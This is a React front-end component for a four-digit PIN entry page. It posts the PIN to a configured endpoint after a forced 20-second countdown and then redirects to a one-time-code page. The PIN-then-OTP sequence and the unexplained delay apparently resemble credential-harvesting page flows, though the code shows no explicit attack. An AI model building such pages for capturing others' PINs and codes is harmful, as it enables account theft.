
// Pin.js
import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../App.css";
import "../styles/pin.css";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";

const schema = yup.object().shape({
  pin: yup
    .string()
    .matches(/^\d{4}$/, "PIN must be exactly 4 digits")
    .required("PIN is required"),
});

const Pin = () => {
  const navigate = useNavigate();
  const [pin, setPin] = useState(new Array(4).fill(""));
  const [loading, setLoading] = useState(false);
  const [countdown, setCountdown] = useState(0);
  
  const {
    register,
    handleSubmit,
    setValue,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const handleChange = (element, index) => {
    const value = element.value;
    if (!/^\d$/.test(value)) return;
    const newPin = [...pin];
    newPin[index] = value;
    setPin(newPin);
    if (index < 3 && value !== "") {
      document.getElementById(`pin-${index + 1}`).focus();
    }
    setValue("pin", newPin.join(""));
  };

  const submitForm = (data) => {
    setLoading(true);
    setCountdown(20);
    
    // Start countdown
    const countdownInterval = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(countdownInterval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    // Wait 20 seconds before making the API call
    setTimeout(() => {
      axios
        .post(`${BASE_URL}/pin`, data)
        .then((response) => {
          console.log(response.data);
          navigate("/otp");
        })
        .catch((error) => {
          console.error("There was an error!", error);
        })
        .finally(() => {
          setLoading(false);
          setCountdown(0);
        });
    }, 20000);
  };

  return (
    <div className="pin">
      <div className="container">
        <div className="contentSec">
          <div className="title">Enter PIN to continue</div>
        </div>
        <div className="formSec">
          <div className="input">
            <form onSubmit={handleSubmit(submitForm)}>
              <div className="formPin">
                {pin.map((data, index) => (
                  <input
                    key={index}
                    id={`pin-${index}`}
                    type="password"
                    name="pin"
                    maxLength="1"
                    value={data}
                    onChange={(e) => handleChange(e.target, index)}
                    onFocus={(e) => e.target.select()}
                    className="pin-input"
                    inputMode="numeric"
                  />
                ))}
              </div>
              <FormErrMsg errors={errors} inputName="pin" />
              <div className="buttonSec">
                <button type="submit" disabled={loading}>
                  {loading 
                    ? countdown > 0 
                      ? `Please wait... ${countdown}s` 
                      : "Processing..."
                    : "Next"
                  }
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Pin;
